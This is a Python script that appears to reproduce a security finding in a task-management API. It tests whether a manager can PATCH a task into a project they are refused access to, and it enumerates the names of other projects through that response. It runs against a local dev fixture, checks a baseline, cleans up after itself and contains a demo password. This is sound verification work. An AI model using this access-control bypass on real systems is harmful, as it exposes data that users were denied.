#!/usr/bin/env python3
"""SEC-F-019 — does PATCH /tasks/{id} accept a project_id the caller cannot reach?

Source-level claim under test
----------------------------
``TaskWriteSerializer.project_id`` binds ``queryset=Project.objects.all()``
(apps/tasks/serializers.py:79-81).  ``create()`` compensates with
``require_project_membership`` (apps/tasks/views.py:120).  ``update()`` has no
equivalent.  So a manager who can see task T should be able to move it into a
project they can neither own nor belong to, and read that project's name and
status back out of the 200 response — data ``GET /projects/{id}`` refuses them
with 403.

The CONTRAST is the finding, not the 200 on its own.

Safety
------
* Output filename is TIMESTAMPED.  DEF-048 was caused by hard-coded output
  names clobbering earlier transcripts; this script must not repeat it.
* Exactly one disposable task is created and it is deleted again.
* Baseline (28 employees / 6 projects / 41 tasks / 11 project-1 members) is
  asserted BEFORE and AFTER.  The script refuses to start if it does not match.
* Nothing else is written.  No existing row is mutated.
"""

import json
import os
import sys
import urllib.error
import urllib.request
from datetime import datetime, timezone

BASE = os.environ.get("WORKHUB_API", "http://localhost:8000/api/v1")
PASSWORD = os.environ.get("WORKHUB_DEMO_PASSWORD", "WorkHub#2026")
ADMIN, MANAGER, MANAGER_2 = "jaydeep@example.com", "tarun@example.com", "neha@example.com"

BASELINE = {"employees": 28, "projects": 6, "tasks": 41, "project_1_members": 11}

log = []


def rec(line=""):
    print(line)
    log.append(line)


def call(method, path, token=None, body=None):
    url = f"{BASE}{path}"
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            return e.code, json.loads(raw) if raw else None
        except json.JSONDecodeError:
            return e.code, {"_raw": raw[:300]}


def login(email):
    st, b = call("POST", "/auth/login", body={"email": email, "password": PASSWORD})
    if st != 200:
        rec(f"FATAL: login {email} -> {st}")
        sys.exit(2)
    return b["access"]


def counts(admin_tok):
    _, emp = call("GET", "/employees?limit=1", admin_tok)
    _, prj = call("GET", "/projects?limit=1&scope=all", admin_tok)
    _, tsk = call("GET", "/tasks?limit=1", admin_tok)
    _, p1 = call("GET", "/projects/1", admin_tok)
    return {
        "employees": emp.get("count"),
        "projects": prj.get("count"),
        "tasks": tsk.get("count"),
        "project_1_members": len(p1.get("members", []) or []),
    }


def main():
    rec("=" * 78)
    rec("SEC-F-019 LIVE REPRODUCTION — PATCH /tasks/{id} with an unreachable project_id")
    rec(f"UTC: {datetime.now(timezone.utc).isoformat()}")
    rec(f"Target: {BASE}")
    rec("=" * 78)

    admin = login(ADMIN)
    mgr = login(MANAGER)        # tarun — the attacker
    login(MANAGER_2)            # neha — owns the unreachable project
    rec(f"\nlogged in: admin={ADMIN}  attacker={MANAGER} (manager)  victim-owner={MANAGER_2}")

    # ---------- baseline BEFORE ----------
    before = counts(admin)
    rec(f"\n--- BASELINE BEFORE --- {json.dumps(before)}")
    if before != BASELINE:
        rec(f"REFUSING TO RUN: baseline mismatch, expected {json.dumps(BASELINE)}")
        sys.exit(3)
    rec("baseline matches the recorded dev fixture — safe to proceed")

    # ---------- topology ----------
    _, allprj = call("GET", "/projects?limit=100&scope=all", admin)
    projects = {p["name"]: p for p in allprj["results"]}
    rec("\n--- TOPOLOGY (as admin) ---")
    for n, p in projects.items():
        rec(f"  id={p['id']:<3} {n:<34} owner={p['owner']['email']:<22} status={p['status']}")

    def member_emails(p):
        return {m["email"] for m in (p.get("members") or [])}

    # The target must be owned by the OTHER manager AND not have the attacker
    # among its members. An empty member list is the wrong test: the seeder
    # gives every project a membership row for its own owner, so COMPLIANCE has
    # exactly one member (neha herself) and nobody else.
    target = next(
        p for p in projects.values()
        if p["owner"]["email"] == MANAGER_2 and MANAGER not in member_emails(p)
    )
    source = next(p for p in projects.values() if p["owner"]["email"] == MANAGER)
    rec(f"\n  UNREACHABLE TARGET  id={target['id']} '{target['name']}' "
        f"(owner {target['owner']['email']}; members={sorted(member_emails(target))}; "
        f"attacker {MANAGER} is NOT among them -> not owner, not member)")
    rec(f"  ATTACKER'S SOURCE   id={source['id']} '{source['name']}' (owner {MANAGER})")

    # ---------- CONTRAST 1: the attacker cannot read the target ----------
    rec("\n--- CONTRAST 1: what the attacker is NOT allowed to know ---")
    st_g, b_g = call("GET", f"/projects/{target['id']}", mgr)
    rec(f"  GET /projects/{target['id']}  as {MANAGER}  -> {st_g}")
    rec(f"    body: {json.dumps(b_g)[:200]}")
    if st_g != 403:
        rec(f"  !! expected 403, got {st_g} — the premise of the finding does not hold")

    # ---------- disposable task ----------
    rec("\n--- creating ONE disposable task in the attacker's own project ---")
    # assigned_to_id and due_date are both required by TaskWriteSerializer, and
    # the assignee must be assignable (active, not soft-deleted). Take a member
    # of the source project so the create cannot fail on membership either.
    _, src_detail = call("GET", f"/projects/{source['id']}", mgr)
    assignee = next(m["id"] for m in src_detail["members"])
    rec(f"  assignee: id={assignee} (a member of project {source['id']})")
    st_c, task = call("POST", "/tasks", mgr, body={
        "title": "SEC-F-019 disposable probe task",
        "description": "Created by integration/probe_secf019_task_project_move.py. Deleted below.",
        "project_id": source["id"],
        "assigned_to_id": assignee,
        "due_date": "2026-12-31",
        "status": "pending",
        "priority": "low",
    })
    rec(f"  POST /tasks -> {st_c}")
    if st_c != 201:
        rec(f"  FATAL: could not create the disposable task: {json.dumps(task)[:300]}")
        sys.exit(4)
    tid = task["id"]
    rec(f"  disposable task id={tid}, project={task['project']['id']} '{task['project']['name']}'")

    verdict = "UNKNOWN"
    try:
        # ---------- THE ATTACK ----------
        rec("\n" + "=" * 78)
        rec(f"ATTACK: PATCH /tasks/{tid} as {MANAGER} with project_id={target['id']} "
            f"('{target['name']}' — a project this user was just refused with 403)")
        rec("=" * 78)
        st_a, b_a = call("PATCH", f"/tasks/{tid}", mgr, body={"project_id": target["id"]})
        rec(f"  -> HTTP {st_a}")
        rec(f"  body: {json.dumps(b_a, indent=2)[:900]}")

        if st_a == 403:
            verdict = "DISPROVEN"
            rec("\n  VERDICT: 403 — the update path DOES enforce membership. "
                "SEC-F-019 does not reproduce.")
        elif st_a == 200:
            moved = (b_a.get("project") or {}).get("id") == target["id"]
            leaked_name = (b_a.get("project") or {}).get("name")
            leaked_status = (b_a.get("project") or {}).get("status")
            rec(f"\n  task now in project id={(b_a.get('project') or {}).get('id')} "
                f"(moved={moved})")
            rec(f"  READ ORACLE — values returned to a user refused 403 seconds ago:")
            rec(f"    project.name   = {leaked_name!r}")
            rec(f"    project.status = {leaked_status!r}")
            if moved and leaked_name == target["name"]:
                verdict = "CONFIRMED"
                rec("\n  VERDICT: CONFIRMED. The task was moved into a project the caller")
                rec("    cannot own, cannot belong to, and cannot GET — and the 200 response")
                rec("    disclosed that project's name and status. The same user received 403")
                rec("    for GET /projects/%s in CONTRAST 1 above." % target["id"])
            else:
                verdict = "PARTIAL"
                rec("\n  VERDICT: 200 but the move/disclosure did not match expectations.")
        else:
            verdict = f"OTHER({st_a})"
            rec(f"\n  VERDICT: unexpected status {st_a}.")

        # ---------- CONTRAST 2: enumeration ----------
        if verdict == "CONFIRMED":
            rec("\n--- CONTRAST 2: is it an enumeration oracle? ---")
            rec("  Re-pointing the same task at each project id and reading the name back.")
            for pid in sorted(p["id"] for p in projects.values()):
                st_e, b_e = call("PATCH", f"/tasks/{tid}", mgr, body={"project_id": pid})
                pr = (b_e.get("project") or {}) if st_e == 200 else {}
                st_v, _ = call("GET", f"/projects/{pid}", mgr)
                rec(f"    project_id={pid:<3} PATCH->{st_e} name={pr.get('name')!r:<36} "
                    f"| direct GET /projects/{pid} -> {st_v}")
            rec("  Any row with PATCH->200 but GET->403 is data reachable one way and not the other.")

        # ---------- can the attacker still see the task? ----------
        st_r, _ = call("GET", f"/tasks/{tid}", mgr)
        rec(f"\n  after the move, GET /tasks/{tid} as {MANAGER} -> {st_r}")

    finally:
        # ---------- CLEANUP ----------
        rec("\n--- CLEANUP ---")
        st_d, _ = call("DELETE", f"/tasks/{tid}", admin)
        rec(f"  DELETE /tasks/{tid} as admin -> {st_d}")
        after = counts(admin)
        rec(f"  BASELINE AFTER: {json.dumps(after)}")
        if after == BASELINE:
            rec("  RESTORED — baseline identical to before.")
        else:
            rec(f"  *** BASELINE NOT RESTORED *** expected {json.dumps(BASELINE)}")
        rec("  NOTE: task create/delete each append an Activity row. Those are not")
        rec("        reversible through the API and are not part of the asserted baseline.")

    rec(f"\nRESULT: {verdict}")

    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    out = f"evidence/security/sec-f-019-live-repro-{stamp}.txt"
    os.makedirs("evidence/security", exist_ok=True)
    with open(out, "w") as fh:
        fh.write("\n".join(log) + "\n")
    print(f"\nwritten: {out}")


if __name__ == "__main__":
    main()
